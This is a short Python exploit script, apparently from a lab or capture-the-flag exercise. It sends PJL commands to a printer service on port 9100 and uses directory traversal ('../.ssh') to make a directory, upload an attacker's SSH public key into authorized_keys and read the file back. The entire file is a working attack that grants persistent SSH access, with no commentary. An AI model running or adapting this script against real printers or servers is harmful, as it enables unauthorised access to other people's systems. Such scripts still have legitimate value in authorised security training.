#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"


def req(payload: bytes, timeout: float = 5) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        return s.recv(8192)
    except socket.timeout:
        return b""


def pjl(cmd: str, extra: bytes = b"") -> bytes:
    return req(cmd.encode() + extra)


print("mkdir", repr(pjl('@PJL FSMKDIR NAME="../.ssh"\r\n')))
print("query", repr(pjl('@PJL FSQUERY NAME="../.ssh"\r\n')))
n = len(KEY)
up = f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\nSIZE={n}\r\n'.encode() + KEY
print("upload", repr(req(up, 8) or b"TIMEOUT"))
print("query2", repr(pjl('@PJL FSQUERY NAME="../.ssh"\r\n')))
dl = pjl('@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys"\r\nSIZE=200\r\nOFFSET=0\r\n')
print("download", len(dl), dl[:120])